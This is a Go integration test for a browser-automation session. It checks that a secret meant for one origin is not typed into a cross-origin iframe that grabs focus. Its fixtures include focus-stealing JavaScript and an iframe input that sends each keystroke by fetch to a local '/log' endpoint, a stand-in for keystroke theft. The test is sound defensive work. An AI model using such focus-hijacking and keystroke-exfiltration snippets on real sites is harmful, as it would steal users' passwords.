//go:build integration

package session_test

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/noetive/riffle/internal/program"
	"github.com/noetive/riffle/internal/session"
)

// A page on the secret's own origin moves focus into a frame from another
// origin the moment its field is focused. The keys that follow must not land
// in that frame.
func TestASecretIsNeverTypedIntoAFrameFocusWasMovedTo(t *testing.T) {
	for name, c := range map[string]struct{ top, frame string }{
		"by the page": {
			top:   `<script>document.getElementById("pw").addEventListener("focus", function () { var f = document.getElementById("f"); f.focus(); f.contentWindow.focus(); });</script>`,
			frame: `<script>window.addEventListener("focus", function(){ document.getElementById("x").focus(); });</script>`,
		},
		"by the frame": {
			frame: `<script>setInterval(function(){ window.focus(); document.getElementById("x").focus(); }, 1);</script>`,
		},
	} {
		t.Run(name, func(t *testing.T) { focusTheft(t, c.top, c.frame) })
	}
}

func focusTheft(t *testing.T, top, frame string) {
	var mu sync.Mutex
	var logged []string
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/log" {
			mu.Lock()
			logged = append(logged, r.URL.Query().Get("v"))
			mu.Unlock()
			return
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<input id="x" oninput="fetch('/log?v='+encodeURIComponent(this.value))">` + frame))
	}))
	defer other.Close()
	// Same host, another port: another origin.
	frameURL := strings.Replace(other.URL, "127.0.0.1", "localhost", 1)
	page := servePage(t, fmt.Sprintf(`<!doctype html><title>login</title>
<input id="pw" type="password" aria-label="Password">
<iframe id="f" src="%s/" style="width:300px;height:60px"></iframe>%s`, frameURL, top))
	const secret = "s3cret-value" // what boundSecret hands out
	s, ctx := newSessionWith(t, session.Config{Policy: program.Policy{Secrets: boundSecret{origin: page}}})
	out := s.Run(ctx, "goto "+page+"/\nwait seconds 1\nfill \"Password\" $secret:pw\nwait seconds 1")
	if !strings.Contains(out, "fill") && !strings.Contains(out, "blocked") && strings.Contains(out, "failed") {
		t.Fatalf("the program must reach the fill:\n%s", out)
	}
	mu.Lock()
	defer mu.Unlock()
	for _, v := range logged {
		if strings.Contains(secret, v) && v != "" {
			t.Fatalf("the frame from another origin received %q of the secret:\n%s", v, out)
		}
	}
	t.Logf("reply:\n%s\nframe saw: %q", out, logged)
}
